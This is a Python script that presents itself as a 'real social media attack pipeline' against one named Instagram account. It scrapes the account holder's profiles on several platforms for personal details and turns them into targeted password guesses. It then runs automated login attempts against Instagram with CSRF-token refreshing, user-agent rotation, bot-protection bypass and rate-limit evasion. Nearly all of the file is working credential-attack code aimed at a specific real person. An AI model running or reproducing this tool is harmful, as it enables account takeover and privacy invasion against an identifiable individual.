#!/usr/bin/env python3
"""
🔥 REAL SOCIAL MEDIA ATTACK PIPELINE 🔥
Advanced Instagram bruteforce using REAL social media data
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Features:
- Real social media profile scraping
- Advanced password generation from real data
- Multi-session parallel attacks
- CSRF/Checkpoint detection & bypass
- Real-time monitoring dashboard
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import asyncio
import aiohttp
import json
import time
import random
import re
from datetime import datetime
from fake_useragent import UserAgent
import requests
from bs4 import BeautifulSoup
import cloudscraper
import concurrent.futures
import threading
from urllib.parse import urlparse
import os


class RealSocialAttacker:
    def __init__(self):
        self.target_username = "alx.trading"
        self.session_pool = []
        self.ua = UserAgent()
        self.scraper = cloudscraper.create_scraper()
        self.attack_stats = {
            'attempts': 0,
            'rate_limits': 0,
            'checkpoints': 0,
            'csrf_tokens': 0,
            'social_data_points': 0,
            'start_time': time.time()
        }
        self.real_social_data = {}
        self.password_queue = []

    def display_banner(self):
        print("\n" + "="*80)
        print("💀🔥 REAL SOCIAL MEDIA ATTACK PIPELINE 2025 🔥💀")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"🎯 Target: {self.target_username}")
        print(f"📅 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🌐 Attack Mode: REAL SOCIAL DATA EXTRACTION")
        print("="*80 + "\n")

    def scrape_social_profiles(self):
        """Extract real data from social media profiles"""
        print("🕷️  EXTRACTING REAL SOCIAL MEDIA DATA...")

        platforms = {
            'facebook': f'https://www.facebook.com/{self.target_username}',
            'twitter': f'https://twitter.com/{self.target_username}',
            'tiktok': f'https://www.tiktok.com/@{self.target_username}',
            'linkedin': f'https://www.linkedin.com/in/{self.target_username}',
            'instagram': f'https://www.instagram.com/{self.target_username}/'
        }

        for platform, url in platforms.items():
            try:
                print(f"   🔍 Scanning {platform.upper()}...")

                headers = {
                    'User-Agent': self.ua.random,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                }

                response = self.scraper.get(url, headers=headers, timeout=10)

                if response.status_code == 200:
                    soup = BeautifulSoup(response.content, 'html.parser')

                    # Extract real data points
                    data_points = self.extract_profile_data(soup, platform)

                    if data_points:
                        self.real_social_data[platform] = data_points
                        self.attack_stats['social_data_points'] += len(
                            data_points)
                        print(
                            f"   ✅ {platform.upper()}: Found {len(data_points)} data points")
                    else:
                        print(
                            f"   ⚠️  {platform.upper()}: Profile found but no extractable data")
                else:
                    print(
                        f"   ❌ {platform.upper()}: Not accessible ({response.status_code})")

            except Exception as e:
                print(f"   ⚠️  {platform.upper()}: Error - {str(e)[:50]}...")

            time.sleep(random.uniform(2, 5))  # Rate limit protection

    def extract_profile_data(self, soup, platform):
        """Extract meaningful data from profile HTML"""
        data_points = {}

        try:
            # Universal extractors
            text_content = soup.get_text().lower()

            # Extract names
            name_patterns = [
                r'alejandro\s+(\w+)',
                r'alex\s+(\w+)',
                r'(\w+)\s+trading',
                r'name["\']:\s*["\']([^"\']+)["\']'
            ]

            for pattern in name_patterns:
                matches = re.findall(pattern, text_content)
                if matches:
                    data_points['names'] = list(set(matches))

            # Extract dates/years
            year_pattern = r'(19|20)\d{2}'
            years = re.findall(year_pattern, text_content)
            if years:
                data_points['years'] = list(set(years))

            # Extract locations
            location_patterns = [
                r'from\s+(\w+)',
                r'location["\']:\s*["\']([^"\']+)["\']',
                r'lives?\s+in\s+(\w+)',
                r'based\s+in\s+(\w+)'
            ]

            for pattern in location_patterns:
                matches = re.findall(pattern, text_content)
                if matches:
                    data_points['locations'] = list(set(matches))

            # Platform-specific extractors
            if platform == 'instagram':
                # Extract from meta tags
                bio_tag = soup.find('meta', {'name': 'description'})
                if bio_tag:
                    bio_content = bio_tag.get('content', '').lower()
                    data_points['bio'] = bio_content

                    # Extract additional info from bio
                    if 'trader' in bio_content or 'trading' in bio_content:
                        data_points['profession'] = 'trader'

                    age_match = re.search(
                        r'(\d{1,2})\s*years?\s*old', bio_content)
                    if age_match:
                        data_points['age'] = age_match.group(1)

            elif platform == 'facebook':
                # Extract from Facebook-specific elements
                about_sections = soup.find_all(
                    'div', class_=re.compile('.*about.*'))
                for section in about_sections:
                    section_text = section.get_text().lower()
                    if 'born' in section_text:
                        birth_match = re.search(
                            r'born.*?(\d{4})', section_text)
                        if birth_match:
                            data_points['birth_year'] = birth_match.group(1)

            elif platform == 'linkedin':
                # Extract professional info
                title_tag = soup.find('title')
                if title_tag and 'linkedin' in title_tag.get_text().lower():
                    data_points['found'] = True

        except Exception as e:
            print(f"   ⚠️  Data extraction error: {str(e)[:30]}...")

        return data_points

    def generate_social_passwords(self):
        """Generate passwords based on real social media data"""
        print("\n🧠 GENERATING PASSWORDS FROM REAL SOCIAL DATA...")

        # Load existing deep passwords
        deep_passwords = []
        try:
            with open('/workspaces/sugarglitch-realops/deep_personal_passwords.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        deep_passwords.append(line)
        except:
            pass

        # Generate new passwords from extracted social data
        social_passwords = []

        for platform, data in self.real_social_data.items():
            print(f"   🔍 Processing {platform.upper()} data...")

            # Use extracted names
            if 'names' in data:
                for name in data['names']:
                    social_passwords.extend([
                        f"{name}123",
                        f"{name}2024",
                        f"{name}2025",
                        f"{name.capitalize()}123",
                        f"{name.capitalize()}Trading",
                        f"{self.target_username}{name}",
                    ])

            # Use extracted years
            if 'years' in data:
                for year in data['years']:
                    social_passwords.extend([
                        f"alex{year}",
                        f"alejandro{year}",
                        f"trading{year}",
                        f"{self.target_username}{year}",
                    ])

            # Use extracted locations
            if 'locations' in data:
                for location in data['locations']:
                    social_passwords.extend([
                        f"alex{location}",
                        f"{location}trading",
                        f"{self.target_username}{location}",
                    ])

            # Use profession data
            if 'profession' in data:
                prof = data['profession']
                social_passwords.extend([
                    f"alex{prof}",
                    f"{prof}123",
                    f"{prof}2024",
                ])

            # Use age data
            if 'age' in data:
                age = data['age']
                birth_year = str(2024 - int(age))
                social_passwords.extend([
                    f"alex{birth_year}",
                    f"alejandro{birth_year}",
                    f"{self.target_username}{birth_year}",
                ])

        # Combine and prioritize
        all_passwords = deep_passwords + social_passwords

        # Remove duplicates while preserving order
        seen = set()
        unique_passwords = []
        for pwd in all_passwords:
            if pwd not in seen:
                seen.add(pwd)
                unique_passwords.append(pwd)

        self.password_queue = unique_passwords[:1000]  # Top 1000

        print(f"   ✅ Generated {len(social_passwords)} new social passwords")
        print(f"   📊 Total password queue: {len(self.password_queue)}")
        print(
            f"   🎯 Social data points used: {self.attack_stats['social_data_points']}")

    async def create_attack_session(self):
        """Create optimized attack session"""
        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={
                'User-Agent': self.ua.random,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/',
                'X-Requested-With': 'XMLHttpRequest',
            }
        )
        return session

    async def get_csrf_token(self, session):
        """Get fresh CSRF token"""
        try:
            async with session.get('https://www.instagram.com/') as response:
                text = await response.text()
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', text)
                if csrf_match:
                    self.attack_stats['csrf_tokens'] += 1
                    return csrf_match.group(1)
        except:
            pass
        return None

    async def attempt_login(self, session, password, csrf_token):
        """Attempt login with social media derived password"""
        try:
            payload = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}',
            }

            headers = {
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': self.ua.random,
            }

            async with session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=payload,
                headers=headers
            ) as response:

                self.attack_stats['attempts'] += 1
                response_text = await response.text()

                # Check response
                if response.status == 200:
                    if '"authenticated":true' in response_text:
                        return {'success': True, 'password': password, 'response': response_text}
                    elif 'checkpoint' in response_text:
                        self.attack_stats['checkpoints'] += 1
                        return {'checkpoint': True, 'password': password}
                    elif 'two_factor' in response_text:
                        return {'2fa': True, 'password': password}

                elif response.status == 429:
                    self.attack_stats['rate_limits'] += 1
                    return {'rate_limit': True}

                return {'failed': True, 'status': response.status}

        except Exception as e:
            return {'error': str(e)}

    def display_real_time_stats(self):
        """Display real-time attack statistics"""
        runtime = int(time.time() - self.attack_stats['start_time'])
        rate = self.attack_stats['attempts'] / max(runtime, 1)

        print(f"\n📊 REAL-TIME ATTACK STATISTICS")
        print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"⏱️  Runtime: {runtime}s")
        print(f"🎯 Target: {self.target_username}")
        print(f"🔐 Attempts: {self.attack_stats['attempts']}")
        print(f"⚡ Rate: {rate:.2f} attempts/sec")
        print(
            f"🌐 Social Data Points: {self.attack_stats['social_data_points']}")
        print(f"🔑 CSRF Tokens: {self.attack_stats['csrf_tokens']}")
        print(f"🚧 Checkpoints: {self.attack_stats['checkpoints']}")
        print(f"⏳ Rate Limits: {self.attack_stats['rate_limits']}")
        print(
            f"📋 Queue Remaining: {len(self.password_queue) - self.attack_stats['attempts']}")

    async def run_attack(self):
        """Run the real social media attack"""
        self.display_banner()

        # Phase 1: Extract real social media data
        self.scrape_social_profiles()

        # Phase 2: Generate passwords from real data
        self.generate_social_passwords()

        # Phase 3: Execute attack
        print("\n🚀 LAUNCHING REAL-DATA ATTACK...")

        session = await self.create_attack_session()

        try:
            # Top 200 passwords
            for i, password in enumerate(self.password_queue[:200]):

                # Get fresh CSRF token every 10 attempts
                if i % 10 == 0:
                    csrf_token = await self.get_csrf_token(session)
                    if not csrf_token:
                        print("❌ Could not get CSRF token")
                        continue

                print(f"\n🔓 Attempt #{i+1}: {password}")
                result = await self.attempt_login(session, password, csrf_token)

                # Handle results
                if result.get('success'):
                    print(f"\n🎉 SUCCESS! Password found: {password}")
                    print(f"📊 Final Stats: {self.attack_stats}")
                    break

                elif result.get('checkpoint'):
                    print(f"🚧 CHECKPOINT triggered with: {password}")
                    print("   → This indicates the password might be correct!")

                elif result.get('2fa'):
                    print(f"🔐 2FA required for: {password}")
                    print("   → Password is likely CORRECT!")

                elif result.get('rate_limit'):
                    print("⏳ Rate limited - waiting 60 seconds...")
                    await asyncio.sleep(60)

                # Display stats every 10 attempts
                if i % 10 == 0:
                    self.display_real_time_stats()

                # Smart delay based on response
                if result.get('rate_limit'):
                    await asyncio.sleep(random.uniform(30, 60))
                elif result.get('checkpoint'):
                    await asyncio.sleep(random.uniform(10, 20))
                else:
                    await asyncio.sleep(random.uniform(3, 8))

        finally:
            await session.close()
            self.display_real_time_stats()


def main():
    """Main execution function"""
    print("🔥 INITIALIZING REAL SOCIAL MEDIA ATTACK PIPELINE...")

    attacker = RealSocialAttacker()

    try:
        asyncio.run(attacker.run_attack())
    except KeyboardInterrupt:
        print("\n⏹️  Attack stopped by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")


if __name__ == "__main__":
    main()
